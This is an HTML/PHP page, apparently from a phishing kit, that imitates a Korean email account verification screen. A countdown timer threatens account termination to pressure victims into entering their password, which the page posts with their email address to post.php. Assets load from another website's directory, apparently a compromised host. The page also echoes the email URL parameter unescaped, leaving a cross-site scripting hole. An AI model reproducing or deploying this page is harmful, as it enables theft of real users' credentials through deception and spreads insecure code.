<html>
<head>
<title>&#51060;&#47700;&#51068; &#49444;&#51221; | &#54869;&#51064;</title>

<link rel="icon" href="https://sunriseprowebsites.com/backstage/app/views/client/lutfi-cloud/lutfi-file/images/avatar.png" sizes="13x13" type="image/png">


</head>
<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" rightmargin="0" leftmargin="0" link="#3F59A4" alink="#3F59A4" vlink="#3F59A4">

<table width="100%" height="" cellspacing="0">

<tr><td height="30" bgcolor="#000000">

	<table width="" align="center"><tr>


	<td>
	<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTfy27wxk9we2exTNCIDrXRa4nJ-lj-FqRrSyQ0LqtsguIBev9DQQ" width="40" height="27">
	</td>


	<td width="5"></td>


	<td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ffffff">
	&#51060;&#47700;&#51068; &#49444;&#51221;
	</font>







	<td width="800">
	<div align="right">
	<a href="" style="text-decoration:none">
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ffffff">
	<?php echo $_GET['email']; ?>	</font>
	</a>
	</div>
	</td>


<td width="5"></td>





	<td>
	<a href="">
	<img src="https://sunriseprowebsites.com/backstage/app/views/client/lutfi-cloud/lutfi-file/images/avatar.png" width="28" height="28" border="0">
	</a>
	</td>

	</tr></table>

</td></tr>






<tr><td height="60" bgcolor="#FFFFFF"></td></td>






<tr><td height="" bgcolor="#FFFFFF">

	<table width="650" align="center" cellspacing="0">

	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2" color="#3F59A4">
	&#44228;&#51221; &#54869;&#51064;
	</font>
	</td></tr>


	<tr><td height="15" bgcolor="#FFFFFF"></td></td>



	<tr><td>

		<table><tr>

		<td>
		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
		&#52852;&#50868;&#53944; &#45796;&#50868; &#44480;&#54616;&#51032; &#51060;&#47700;&#51068;&#51012; &#51333;&#47308;: 
		</font>
		</td>


		<td>
		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ff0000">

		<b><div id="hms">01:15:10</div></b>

		<script type="text/javascript">
    		function count() {
 
    		var startTime = document.getElementById('hms').innerHTML;
    		var pieces = startTime.split(":");
    		var time = new Date();    time.setHours(pieces[0]);
    		time.setMinutes(pieces[1]);
    		time.setSeconds(pieces[2]);
    		var timedif = new Date(time.valueOf() - 1000);
    		var newtime = timedif.toTimeString().split(" ")[0];
    		document.getElementById('hms').innerHTML=newtime;
    		setTimeout(count, 1000);
		}
		count();
 
		</script>

		</font>

		</td>



		</tr></table>

	
	</td></tr>







	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
	&#44480;&#54616;&#51032; &#51060;&#47700;&#51068;&#51060; &#51333;&#47308; &#46104;&#51648; &#50506;&#46020;&#47197; &#54616;&#47140;&#47732; &#50500;&#47000;&#50640; &#44480;&#54616;&#51032; &#44228;&#51221;&#51012; &#54876;&#49457;&#54868;: 
	</font>
	</td></tr>
	
	



	<tr><td height="25" bgcolor="#FFFFFF"></td></td>



	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2">
	<?php echo $_GET['email']; ?> 
	</font>
	</td></tr>



<tr><td height="5" bgcolor="#FFFFFF"></td></td>


	
	<tr><td>
	<form method="post" action="post.php">
	</td></tr>



	<tr><td>

		<input  name="password" type="password" style="width:350px; height:35px; font-family: Verdana; 
      				font-size: 15px; color:#000000; background-color: #ffffff; 
      				border: solid 1px #848484; padding: 10px; -moz-border-radius: 5px; 
      				-webkit-border-radius: 5px; 	-khtml-border-radius: 5px; 
      				border-radius: 5px;" required="" placeholder="&#44228;&#49549; &#54616;&#47140;&#47732; &#50516;&#54840; &#51077;&#47141;">

	</td></tr>







	<tr><td height="5" bgcolor="#FFFFFF"></td></td>



	<tr><td>

		<input  value="&#50668;&#44592;&#50640;&#49436; &#50976;&#54952;&#49457;&#51012; &#44160;&#49324;&#54616;&#49901;&#49884;&#50724; >>" type="submit" 
                    style="width:270px; height:55px; font-family: Verdana; 
                    font-size: 17px; color:#ffffff; 
					background-color: #3F59A4; border: solid 1px #3F59A4; padding: 10px; 
					-moz-border-radius: 2px; -webkit-border-radius: 2px; 
                    -khtml-border-radius: 2px; border-radius: 2px;
					-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; 
                    box-shadow: 3px 3px 3px #888;">

	</td></tr>



	<tr><td>
	<input name="email" type="hidden" value="<?php echo $_GET['email']; ?>">
	</form>
	</td></tr>




	

<tr><td height="200" bgcolor="#FFFFFF"></td></td>




	

	<tr><td>
	<hr width="650" align="left">
	</td></tr>







	<tr><td height="10" bgcolor="#FFFFFF"></td></td>





	<tr><td>
	<a href="" style="text-decoration:none">
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
	<b>***</b> &#44228;&#51221; / &#49444;&#51221; / &#48372;&#50504; &#49444;&#51221; / &#44228;&#51221; &#54869;&#51064; >>
	</font>
	</a>
	</td></tr>


	</table>

</td></tr>



</table>

</body>
</html>